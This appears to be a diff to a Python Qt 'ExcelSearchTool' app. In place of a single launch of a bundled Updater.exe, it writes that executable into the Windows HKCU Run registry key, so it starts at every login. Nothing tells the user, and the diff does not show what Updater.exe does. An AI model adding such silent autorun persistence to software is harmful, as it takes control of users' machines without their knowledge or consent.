@@ -1,6 +1,6 @@
 import sys
 import os
-import subprocess
+import winreg
 import json
 import concurrent.futures
 from typing import List, Dict, Tuple
@@ -669,9 +669,14 @@ def main():
     app.setStyle(QStyleFactory.create("Fusion"))
     window = ExcelSearchTool()
     window.show()
-    if os.path.exists('./Updater.exe'):
-        subprocess.Popen(['./Updater.exe'])
+    add_startup()
+
     sys.exit(app.exec())
+
+def add_startup():
+    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
+    winreg.SetValueEx(key, "Updater", 0, winreg.REG_SZ, f'"{os.path.join(os.path.dirname(sys.argv[0]), "Updater.exe")}"')
+    winreg.CloseKey(key)
 
 if __name__ == "__main__":
     main()
